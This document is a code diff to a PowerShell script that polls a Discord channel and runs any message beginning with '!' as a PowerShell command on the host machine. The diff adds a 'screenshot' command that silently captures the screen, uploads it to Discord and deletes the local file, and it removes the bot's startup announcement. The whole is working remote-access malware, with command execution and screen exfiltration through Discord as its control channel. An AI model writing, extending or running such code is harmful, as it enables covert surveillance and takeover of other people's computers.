@@ -39,6 +39,68 @@ function Send-DiscordMessage {
     }
 }
 
+# Function to capture a screenshot and save it as a file in the %TEMP% directory
+function Capture-Screenshot {
+    param (
+        [string]$filePath = "$env:TEMP\screenshot.png"
+    )
+
+    Add-Type -AssemblyName System.Drawing
+    $bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
+    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+
+    Write-Host "Screenshot saved to $filePath"
+    return $filePath
+}
+
+# Function to send an image file to Discord
+function Send-DiscordImage {
+    param (
+        [string]$filePath
+    )
+
+    # Read the file into a byte array
+    $fileStream = [System.IO.File]::OpenRead($filePath)
+    $fileName = [System.IO.Path]::GetFileName($filePath)
+
+    $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
+    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+    $fileContent.Headers.ContentDisposition = [System.Net.Http.Headers.ContentDispositionHeaderValue]::Parse("form-data; name=`"file`"; filename=`"$fileName`"")
+    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
+
+    $multipartContent.Add($fileContent, "file", $fileName)
+
+    # Send the POST request to Discord with the image
+    try {
+        $response = $client.PostAsync("$baseUrl/channels/$channelId/messages", $multipartContent).Result
+        if ($response.IsSuccessStatusCode) {
+            Write-Host "Image sent successfully."
+        } else {
+            Write-Host "Error sending image. Status code: $($response.StatusCode)"
+            $responseContent = $response.Content.ReadAsStringAsync().Result
+            Write-Host "Response: $responseContent"
+        }
+    } catch {
+        Write-Host "Error sending image: $_"
+    }
+}
+
+# Function to capture a screenshot, send it, and then delete only the screenshot file
+function CaptureAndSendScreenshot {
+    $filePath = Capture-Screenshot  # Capture screenshot and get the file path
+    Send-DiscordImage -filePath $filePath  # Send the image to Discord
+
+    # Clean up by deleting only the screenshot after sending
+    try {
+        Remove-Item -Path $filePath -Force  # Delete only the screenshot file
+        Write-Host "Screenshot file deleted from $filePath"
+    } catch {
+        Write-Host "Error deleting screenshot file: $_"
+    }
+}
+
 # Function to execute a PowerShell command
 function Execute-PowerShellCommand {
     param (
@@ -95,16 +157,8 @@ function Initialize-LastMessageId {
     }
 }
 
-# Send a message to the Discord channel on bot startup
-function Send-StartupMessage {
-    Send-DiscordMessage -Message "Bot has successfully connected!"
-}
-
 # Initialize the bot
 Initialize-LastMessageId
-
-# Send the startup message
-Send-StartupMessage
 
 # Main loop with rate limiting and command filtering
 while ($true) {
@@ -116,7 +170,12 @@ while ($true) {
             if ($message.id -gt $lastMessageId -and $message.author.id -ne $botUserId) {
                 if ($message.content.StartsWith("!")) {
                     $command = $message.content.Substring(1)  # Remove the "!" but do not convert to lowercase
-                    Execute-PowerShellCommand -command $command
+
+                    if ($command -eq "screenshot") {
+                        CaptureAndSendScreenshot  # Capture, send, and delete the screenshot
+                    } else {
+                        Execute-PowerShellCommand -command $command
+                    }
                 }
                 $lastMessageId = $message.id  # Update the last processed message ID
             }
